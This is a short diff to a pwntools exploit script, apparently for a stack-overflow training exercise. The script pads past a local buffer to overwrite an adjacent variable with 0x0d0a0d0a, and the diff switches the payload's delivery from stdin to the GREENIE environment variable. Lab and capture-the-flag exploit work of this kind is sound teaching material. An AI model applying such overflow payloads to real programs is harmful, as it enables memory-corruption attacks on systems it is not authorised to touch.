@@ -5,15 +5,15 @@ gen_names = {}
 gen_var_locations = {}
 
 e = ELF(gen_filename)
-p = e.process()
 
 buff = gen_names["buffer"]
 mod = gen_names["modified"]
 
 payload = b''
 payload += (gen_var_locations[mod][-1] - gen_var_locations[buff][-1]) * b'a'
-payload += b'b'
-p.sendline(payload)
+payload += p32(0x0d0a0d0a)
+
+p = e.process(env={"GREENIE": payload})
 
 p.stream()
 
